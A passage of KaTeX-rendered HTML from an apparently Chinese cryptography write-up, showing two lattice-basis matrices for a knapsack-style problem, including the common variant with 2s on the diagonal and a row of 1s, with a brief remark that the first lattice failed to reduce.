stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\left(\begin{matrix}1&amp;0&amp;…&amp;0&amp;a[0][63]&amp;a[1][63]&amp;a[2][63]&amp;a[3][63]\\0&amp;1&amp;…&amp;0&amp;a[0][62]&amp;a[1][62]&amp;a[2][62]&amp;a[3][62]\\⋮&amp;⋮&amp;⋱&amp;⋮&amp;⋮&amp;⋮&amp;⋮&amp;⋮\\0&amp;0&amp;…&amp;1&amp;a[0][0]&amp;a[1][0]&amp;a[2][0]&amp;a[3][0]\\0&amp;0&amp;…&amp;0&amp;b[0]&amp;b[1]&amp;b[2]&amp;b[3]\\\end{matrix}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:6.66em;vertical-align:-3.079999999999999em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.550045em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-1.8999850000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-2.4949950000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-3.090005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-3.6850150000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-4.280025em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-4.3100249999999996em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-5.550045em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.240000000000001em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-5.04em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-3.18em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋱</span></span></span><span style="top:-1.9800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-0.7800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.550045em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-1.8999850000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-2.4949950000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-3.090005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-3.6850150000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-4.280025em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-4.3100249999999996em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-5.550045em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>但是构造完发现格不出来，尝试常见的优化</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋱</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\left(\begin{matrix}2&amp;0&amp;…&amp;0&amp;a[0][63]&amp;a[1][63]&amp;a[2][63]&amp;a[3][63]\\0&amp;2&amp;…&amp;0&amp;a[0][62]&amp;a[1][62]&amp;a[2][62]&amp;a[3][62]\\⋮&amp;⋮&amp;⋱&amp;⋮&amp;⋮&amp;⋮&amp;⋮&amp;⋮\\0&amp;0&amp;…&amp;2&amp;a[0][0]&amp;a[1][0]&amp;a[2][0]&amp;a[3][0]\\1&amp;1&amp;…&amp;1&amp;b[0]&amp;b[1]&amp;b[2]&amp;b[3]\\\end{matrix}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:6.66em;vertical-align:-3.079999999999999em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.550045em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-1.8999850000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-2.4949950000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-3.090005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-3.6850150000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-4.280025em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-4.3100249999999996em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-5.550045em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.240000000000001em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-5.04em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-3.18em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋱</span></span></span><span style="top:-1.9800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-0.7800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" 